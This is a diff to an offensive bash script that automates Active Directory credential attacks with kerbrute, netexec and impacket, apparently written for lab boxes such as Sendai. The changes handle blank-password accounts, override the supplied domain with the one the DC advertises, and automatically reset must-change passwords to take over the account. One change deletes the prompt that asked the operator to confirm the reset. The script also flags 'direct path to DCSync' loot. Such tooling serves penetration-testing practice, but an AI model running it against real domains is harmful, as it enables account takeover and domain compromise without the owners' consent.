@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.37.0"
+readonly VERSION="1.37.1"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -260,12 +260,21 @@ nxc_cred_args() {
         a+=(-u "$USER" -k --use-kcache)
         [[ -n "$DOMAIN" ]] && a+=(-d "$DOMAIN")
     else
-        [[ -n "$USER" ]] && a+=(-u "$USER")
-        if   [[ -n "$HASH" ]]; then a+=(-H "$HASH")
-        elif [[ -n "$PASS" ]]; then a+=(-p "$PASS")
-        else a+=(-u '' -p ''); fi
+        if [[ -n "$USER" ]]; then
+            # A KNOWN user — an EMPTY password is still a valid credential (blank-password
+            # accounts), so pass `-p ''` for that user. Do NOT fall through to the
+            # anonymous `-u '' -p ''` branch (that produced a malformed double `-u`).
+            a+=(-u "$USER")
+            if   [[ -n "$HASH" ]]; then a+=(-H "$HASH")
+            else a+=(-p "$PASS"); fi
+        else
+            a+=(-u '' -p '')        # truly anonymous (no user at all)
+        fi
         [[ -n "$DOMAIN" ]] && a+=(-d "$DOMAIN")
-        [[ "$KERBEROS" == "1" && -n "$DC_FQDN" ]] && a+=(-k)
+        # Only force Kerberos (-k) when we actually have something Kerberos can use
+        # (a non-empty password or a hash). `-k` with a blank password and no ticket
+        # breaks ("invalid principal syntax"); NTLM SMB handles `-p ''` cleanly.
+        [[ "$KERBEROS" == "1" && -n "$DC_FQDN" && ( -n "$PASS" || -n "$HASH" ) ]] && a+=(-k)
     fi
     printf '%s\n' "${a[@]}"
 }
@@ -549,7 +558,19 @@ phase_discovery() {
     [[ "$parsed_dom"  == "$DC_IP" ]] && parsed_dom=""
 
     [[ -n "$parsed_host" ]] && { DC_HOST="$parsed_host"; ok "DC hostname: ${C_BOLD}$DC_HOST${C_RESET}"; }
-    if [[ -z "$DOMAIN" && -n "$parsed_dom" ]]; then DOMAIN="$parsed_dom"; ok "Domain detected: ${C_BOLD}$DOMAIN${C_RESET}"; fi
+    if [[ -n "$parsed_dom" ]]; then
+        if [[ -z "$DOMAIN" ]]; then
+            DOMAIN="$parsed_dom"; ok "Domain detected: ${C_BOLD}$DOMAIN${C_RESET}"
+        elif [[ "${DOMAIN,,}" != "${parsed_dom,,}" ]]; then
+            # The DC's advertised domain IS the authoritative Kerberos realm. A mismatch
+            # means the -d / guessed value is wrong (e.g. sendai.htb vs the real
+            # sendai.vl) → KDC_ERR_WRONG_REALM on every getTGT, so the whole pivot dies
+            # before must-change resets can fire. Trust the DC over what we were told,
+            # and rebuild the FQDN/realm from it.
+            warn "Supplied domain '${DOMAIN}' ≠ DC-advertised '${parsed_dom}' → using the DC's realm (authoritative)"
+            DOMAIN="$parsed_dom"; DC_FQDN=""
+        fi
+    fi
 
     # Fallback: resolve domain/FQDN via LDAP rootDSE, then LDAPS certificate.
     # Works on Kerberos-only DCs where SMB fingerprinting yields nothing.
@@ -924,8 +945,10 @@ _change_expired_password() {
     [[ -z "$PASS" && -n "$HASH" ]] && return 1
     local tool; tool=$(command -v changepasswd.py || command -v impacket-changepasswd) || return 1
     local newpw="$PIVOT_PW" host="${DC_FQDN:-$DC_IP}"
-    warn "Password for '${USER}' is EXPIRED / must-change — resetting to regain access (the weak/known pw is the foothold on boxes like Sendai)"
-    abuse_confirm "  Set a new password for '${USER}' (expired anyway) and continue as them?" || return 1
+    local _oldshow="${PASS:-<empty>}"
+    warn "Account '${USER}' must change its password at next logon (old password: ${_oldshow})."
+    warn "  → Setting a NEW password automatically so we can log in as '${USER}': ${C_BOLD}${newpw}${C_RESET}"
+    warn "  (this is why you saw a 'Password:' prompt before — it's no longer needed; the change is automatic now)"
     # The transport that works depends on the DC: kpasswd (Kerberos), rpc-samr
     # (SMB), or ldap. Force-pinning one (we used to pin kpasswd) fails on DCs where
     # that channel is closed — try them in order and stop at the first success.
@@ -980,7 +1003,13 @@ phase_validate_creds() {
     # --- Step 1: request the TGT FIRST. getTGT talks to -dc-ip directly, so it
     # works even before DNS/hosts is sorted, and a successful TGT is definitive
     # proof the credentials are valid. ---
-    if [[ "$KERBEROS" == "1" ]] && have impacket-getTGT && [[ -n "$DOMAIN" ]]; then
+    if [[ "$KERBEROS" == "1" ]] && have impacket-getTGT && [[ -n "$DOMAIN" ]] \
+       && { [[ -n "$PASS" ]] || [[ -n "$HASH" ]]; }; then
+        # NOTE: skipped when the password is EMPTY (blank-password accounts) — getTGT
+        # can't take an empty password on the CLI, it would drop to an interactive
+        # "Password:" prompt (that confusing prompt you saw). We validate such accounts
+        # over NTLM SMB below instead, where `-p ''` works and STATUS_PASSWORD_MUST_CHANGE
+        # is detected → automatic reset.
         subsection "Requesting Kerberos TGT first (-dc-ip, DNS-independent)"
         local tgt="$OUTDIR/$(_safe_name "$USER").ccache" tgtout=""
         rm -f "${USER}.ccache"
@@ -1019,6 +1048,14 @@ phase_validate_creds() {
             IS_DC_ADMIN=1
             loot "★★★ ${USER} is LOCAL ADMIN on the DC — direct path to DCSync ★★★"
         fi
+    elif echo "$out" | grep -qiE 'STATUS_PASSWORD_MUST_CHANGE|KEY_EXPIRED|PWD_EXPIRED'; then
+        # The account authenticates but must change its password at next logon — this IS
+        # the foothold (blank/known password flagged must-change). Reset it AUTOMATICALLY
+        # (the current empty/known password is the old one); the new credential is then
+        # re-queued and assessed via the normal path. No interactive prompt.
+        loot "★ '${USER}' authenticates but MUST change its password at next logon → auto-resetting now"
+        if _change_expired_password; then return; fi
+        warn "Automatic password reset for '${USER}' failed (see log) — cannot use this account yet"; return
     elif [[ "$HAVE_AUTH" == "1" ]]; then
         warn "SMB check inconclusive, but the TGT proves the creds — proceeding authenticated"
     else
